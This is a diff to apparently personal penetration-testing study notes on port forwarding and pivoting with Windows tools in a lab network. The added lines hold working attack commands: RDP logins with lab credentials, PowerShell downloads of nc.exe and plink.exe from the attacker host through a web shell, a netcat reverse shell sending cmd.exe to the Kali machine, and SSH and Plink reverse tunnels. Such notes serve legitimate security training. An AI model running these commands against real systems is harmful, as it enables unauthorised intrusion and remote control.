@@ -2848,7 +2848,57 @@ Reference
 
     proxychains ./ssh_remote_dynamic_client -i 10.4.133.64 -p 9062
     ```
-- Port forward with window tools  
+- Port forward with window tools ssh.exe
+  - Kali: 192.168.45.233, MULTISERVER03: 192.168.202.64, DB:10.4.202.215
+  - RDP to MULTISERVER03 + use openSSH to create a port forward to reach 4141 on PGDATABASE01 from Kali
+  ```
+  kali@kali:~$ sudo systemctl start ssh
+  kali@kali:~$ xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.202.64  -->MULTISERVER03
+
+  #target
+  C:\Users\rdp_admin>where ssh -->command prompt
+  ssh.exe -V
+  C:\Users\rdp_admin>ssh -N -R 4141 kali@192.168.45.231 -->Kali
+
+  #kali
+  nano etc/proxychains4.conf
+  socks5 127.0.0.1 4141
+
+  proxychains ./ssh_exe_exercise_client.bin -i 10.4.202.215 -->DB
+  ```
+- Port forward with window tools Plink
+  - MULTISERVER03: 192.168.202.64
+  - RDP to MULTISERVER03 by using [Plink](https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe)
+  ```
+  #kali
+  kali@kali:~$ sudo systemctl start apache2
+  find / -name nc.exe 2>/dev/null 
+  sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
+
+  #web
+  browse to pre-compromised http://192.168.202.64/umbraco/forms.aspx web shell -->MULTISERVER03
+  powershell wget -Uri http://192.168.45.231/nc.exe -OutFile C:\Windows\Temp\nc.exe  --> execute
+
+  #kali
+  kali@kali:~$ nc -nvlp 4446
+
+  #web
+  C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.231 4446 -->Kali
+
+  #rs
+  c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.45.231/plink.exe -OutFile C:\Windows\Temp\plink.exe
+  c:\windows\system32\inetsrv>cd C:\Windows\Temp
+  C:\Windows\Temp>plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.231  -->Kali
+
+  OR
+  taskkill /f /t /im plink.exe
+  cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.231
+
+  #kali
+  ss -ntplu
+  kali@kali:~$ xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
+  ```
+- Port forward with window tools Netsh
 
 ## Penetration testing report 
 - note editor:
